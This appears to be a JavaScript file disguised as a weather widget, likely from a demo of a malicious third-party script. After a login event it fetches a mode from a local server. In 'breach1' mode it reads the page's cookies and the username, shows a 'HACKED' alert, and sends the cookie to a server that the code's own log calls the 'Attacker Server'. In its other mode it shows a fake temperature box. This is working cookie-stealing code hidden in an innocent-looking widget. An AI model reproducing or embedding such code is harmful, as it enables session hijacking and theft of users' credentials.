console.log("Weather widget loaded");

async function runAttack() {
  try {
    const res = await fetch("http://localhost:5000/mode");
    const data = await res.json();

    const mode = data.mode;

    const cookie = document.cookie;

    if (mode === "breach1") {

      // тепер cookie точно є після login
      const stolenCookie = cookie;

      alert(
        "HACKED: I can see your cookies: " +
        stolenCookie +
        " and User: " +
        document.getElementById("username").innerText
      );

      fetch(`http://localhost:5000/log?data=${stolenCookie}`);

      console.log("Cookie successfully sent to Attacker Server!");

    } else {
      const box = document.createElement("div");
      box.style.position = "fixed";
      box.style.top = "20px";
      box.style.right = "20px";
      box.style.padding = "10px";
      box.style.background = "white";
      box.innerText = "Temperature: 12°C";
      document.body.appendChild(box);
    }

  } catch (e) {
    console.log("Mode fetch failed", e);
  }
}

window.addEventListener("userLoggedIn", runAttack);